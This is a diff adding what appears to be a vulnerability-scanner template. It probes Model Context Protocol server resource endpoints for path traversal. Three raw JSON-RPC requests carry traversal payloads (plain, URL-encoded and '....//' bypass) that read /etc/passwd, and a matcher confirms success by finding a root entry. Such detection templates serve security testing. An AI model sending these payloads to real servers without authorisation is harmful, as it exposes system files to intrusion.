@@ -1,0 +1,52 @@
+id: mcp-path-traversal
+
+info:
+  name: MCP Resource Path Traversal
+  author: razashariff
+  severity: high
+  description: |
+    MCP server resource endpoints are vulnerable to path traversal attacks
+    allowing access to files outside the intended resource directory.
+  reference:
+    - https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html
+  classification:
+    cwe-id: CWE-22
+    cvss-score: 7.5
+  tags: mcp,ai-agent,path-traversal,owasp
+  metadata:
+    max-request: 3
+    owasp-mcp: MCP-005
+
+http:
+  - raw:
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"jsonrpc":"2.0","method":"resources/read","params":{"uri":"file://../../etc/passwd"},"id":1}
+
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"jsonrpc":"2.0","method":"resources/read","params":{"uri":"file://..%2f..%2fetc%2fpasswd"},"id":2}
+
+      - |
+        POST {{BaseURL}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"jsonrpc":"2.0","method":"resources/read","params":{"uri":"file://....//....//etc/passwd"},"id":3}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - 'root:.*:0:0'
+        part: body
